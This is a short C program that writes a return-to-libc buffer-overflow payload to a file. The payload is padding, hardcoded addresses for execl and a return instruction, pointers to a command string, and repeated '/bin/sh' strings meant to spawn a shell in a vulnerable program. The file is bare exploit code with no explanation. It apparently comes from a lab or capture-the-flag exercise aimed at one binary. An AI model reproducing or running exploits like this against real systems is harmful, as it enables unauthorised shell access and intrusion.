#include <stdio.h>

int main (int argc, const char * argv[]) {
	int offset = 50;
	if (argc == 2) {
		offset = atoi(argv[1]);
	}
	int i;
	FILE * fp = fopen("data.txt", "w");
	void * basePointer = (void *)0xffffd1fc;
	void * commandAddr = (void *)(basePointer + offset);
	void * execlAddr = (void *)0x8053ab0;
	void * execReturn = (void *)0x80492c8; //hlt instruction
	unsigned int nullInt = 0;
	for (i = 0; i < 0x88; i++) {
		fprintf(fp, "a");
	}
	fwrite(&execlAddr, 4, 1, fp);
	fwrite(&execlAddr, 4, 1, fp);
	fwrite(&execReturn, 4, 1, fp);
	fwrite(&commandAddr, 4, 1, fp);
	fwrite(&commandAddr, 4, 1, fp);
	fwrite(&nullInt, 4, 1, fp);
	for (i = 0; i < 30; i++) {
		fprintf(fp, "/bin/sh%c", 0);
	}
	fclose(fp);
	return 0;
}
